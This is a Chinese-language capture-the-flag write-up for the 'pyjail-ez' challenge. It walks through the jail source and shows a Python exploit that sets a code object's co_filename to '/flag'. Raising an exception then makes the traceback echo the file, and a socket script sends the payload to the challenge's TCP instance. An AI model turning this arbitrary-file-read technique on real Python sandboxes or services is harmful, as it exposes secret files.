# pyjail-ez??!（#83，Misc / 864pt）Writeup

> 状态：**Accepted**（平台返回 `Accepted`）
> Flag：`HTUCTF{11a5d2fe-19bc-4dfb-a9f6-de8be4fbadd3}`
> 实例：`103.163.47.230:33728`（原始 TCP）

---

## 一、题目代码

```python
import base64, dis, marshal, sys, traceback, types

if sys.version_info[:2] != (3, 10):
    sys.exit("unsupported runtime")

MAX_CODE = 1024
BANNED_OPS = {
    "IMPORT_NAME", "IMPORT_FROM", "IMPORT_STAR",
    "LOAD_NAME", "STORE_NAME", "DELETE_NAME",
    "LOAD_GLOBAL", "STORE_GLOBAL", "DELETE_GLOBAL",
    "LOAD_FAST", "STORE_FAST", "DELETE_FAST", "LOAD_CLOSURE",
    "LOAD_BUILD_CLASS", "LOAD_ASSERTION_ERROR", "LOAD_METHOD", "LOAD_ATTR",
    "MAKE_FUNCTION", "CALL_METHOD",
}

def check(co):
    if type(co) is not types.CodeType:                 reject("not a code object")
    if len(co.co_code) > MAX_CODE:                     reject("too large")
    if co.co_names:                                    reject("names are forbidden")
    if co.co_nlocals != 0 or co.co_varnames:            reject("locals are forbidden")
    if any(isinstance(c, types.CodeType) for c in co.co_consts):
        reject("nested code objects are forbidden")
    for ins in dis.get_instructions(co):
        if ins.opname in BANNED_OPS:                   reject("banned opcode: " + ins.opname)

def main():
    sys.stdout.write("payload(base64 marshal) > ")
    line = sys.stdin.buffer.readline().strip()
    co = marshal.loads(base64.b64decode(line, validate=True))
    check(co)
    try:
        eval(co, {"__builtins__": None})          # <-- 关键：异常会被回显
    except BaseException:
        sys.stdout.write(traceback.format_exc())  # <-- 关键：traceback 会去读源文件
```

服务是**原始 TCP**：连上后收到 `payload(base64 marshal) > `，发一行 base64（Python 3.10 的 `marshal.dumps` 输出），跑完直接断。

---

## 二、为什么"常规逃逸"全死

`__builtins__` 被设成 `None`，且 `co_names` 必须为空 tuple —— 这意味着所有依赖**名字索引**的指令（属性访问、全局查找、导入）在语义上已经废掉了一半；出题人还把 `IMPORT_FROM`（业界常用的 `LOAD_ATTR` 马甲，LA CTF 2023 `Pycjail` 的解法）一并禁了。

能带进 `co_consts` 的对象只有纯数据 + code object，而 code object **不是 callable**，`CALL_FUNCTION*` 调不动它，创建函数又只剩 `MAKE_FUNCTION`（禁）。

> 完整排除过程（跳转走私 / CACHE 走私 / marshal 可序列化对象枚举 / `MATCH_CLASS` 等）见同目录 `分析笔记.md`。

**结论：这题根本不需要拿到任何"活对象"。**

---

## 三、真正的突破口：traceback 会帮我们 `open()`

注意 `main()` 里这两行：

```python
eval(co, {"__builtins__": None})
...
sys.stdout.write(traceback.format_exc())
```

Python 的 `traceback` 模块在格式化栈帧时，为了让回溯好看，会去**把源码行读出来**。链路是：

```
traceback.format_exc()
  -> TracebackException(...).format()
    -> StackSummary.extract()          # 每个 frame
      -> FrameSummary._format()        # 取 f.f_lineno
        -> linecache.getline(filename, lineno, f_globals)
          -> linecache.updatecache()   # os.stat() + tokenize.open(fullname).readlines()
```

而 **`filename` 取自 `frame.f_code.co_filename`** —— 这是 code object 的一个普通字段，**check 完全不管它**，我们想写什么就写什么。
`lineno` 取自 `f_lineno`，由 `co_firstlineno` 决定，同样可控。

于是：

1. `co_filename = "/flag"`（任意绝对路径）
2. `co_firstlineno = 1`（想读第几行就填几）
3. code 里执行 `1/0` → 抛 `ZeroDivisionError` → 进 `except BaseException` → `format_exc()`
4. linecache 打开 `/flag` 把第 1 行读出来，原样打印进回溯的源码行位置

**一条任意文件读，而且完全不需要 `__builtins__`、不需要任何属性访问、不碰任何禁用 opcode。**

`1/0` 编译出的指令只有 `LOAD_CONST / BINARY_TRUE_DIVIDE / RETURN_VALUE`，`co_names == ()`、`co_nlocals == 0`、`co_consts = (1, 0, None)`，`len(co_code)` 远小于 1024 —— check 全过。

---

## 四、Exp

```python
# 必须用 Python 3.10 运行（容器是 3.10.20，marshal 格式需一致）
import base64, marshal, socket

HOST, PORT = "103.163.47.230", 33728

co = compile("1/0", "<jail>", "exec")            # 触发 ZeroDivisionError
co = co.replace(co_filename="/flag",            # 想读的文件
                co_firstlineno=1)              # 想读的行号
payload = base64.b64encode(marshal.dumps(co)).decode()

s = socket.create_connection((HOST, PORT), timeout=8)
s.recv(4096)                                     # 吃掉提示符
s.sendall(payload.encode() + b"\n")
print(s.recv(8192).decode())
```

完整脚本（含多路径 / 多行号批量探测）：`exploit.py`。

> 坑：用 3.11+ 的解释器生成 marshal 送过去会直接 `bad payload: ValueError`（marshal 版本不兼容）。本机 3.10 在
> `C:/Users/ASUS/AppData/Roaming/uv/python/cpython-3.10.20-windows-x86_64-none/python.exe`。

---

## 五、回显

```
payload(base64 marshal) > Traceback (most recent call last):
  File "/app/jail.py", line 63, in main
    eval(co, {"__builtins__": None})
  File "/flag", line 1, in <module>
    HTUCTF{11a5d2fe-19bc-4dfb-a9f6-de8be4fbadd3}
ZeroDivisionError: division by zero
```

flag 就坐在它本该显示源码行的位置上。第一次尝试即命中 `/flag`，无需换路径。

提交 → `Accepted`。

---

## 六、一句话总结

pyjail 里**回显本身就是侧信道**。出题人封死了所有"拿到活对象再逃逸"的路，却忘了 `traceback.format_exc()` 内部会调用 `linecache.getline(co_filename, lineno)` —— 而 `co_filename` / `co_firstlineno` 是攻击者可控的 code object 字段。于是"打印异常"这个善后逻辑，直接变成了 `open(co_filename).readlines()[lineno-1]`。

---

## 附：怎么在本地跑（Windows / Git Bash 实测）

```bash
cd "D:/桌面/htu/misc/pyjail-ez!"
PY310="/c/Users/ASUS/AppData/Roaming/uv/python/cpython-3.10.20-windows-x86_64-none/python.exe"

# 1) 本地复跑 jail（必须 3.10，py -3.10 在本机 launcher 里没注册，会报 No suitable Python runtime）
"$PY310" gen_payload.py "D:/桌面/htu/misc/pyjail-ez!/_flag_demo.txt" 1 > _p1.txt
"$PY310" jail.py < _p1.txt      # 回溯里直接打印出 _flag_demo.txt 第 1 行

# 2) 打远程（Git Bash 会篡改以 / 开头的参数，必须关掉 MSYS 路径转换）
MSYS2_ARG_CONV_EXCL='*' "$PY310" exploit.py 103.163.47.230 35142 /flag
```

- 目录里自带的 `payload.txt` 是旧版（3.9 marshal 头），喂给 3.10 的 `marshal.loads` 会 **Segmentation fault**，用 `gen_payload.py` 重造即可。
- `exploit.py` 默认 `HOST/PORT = 103.163.47.230:35142`，也支持 `exploit.py <host> <port> <path...>`。
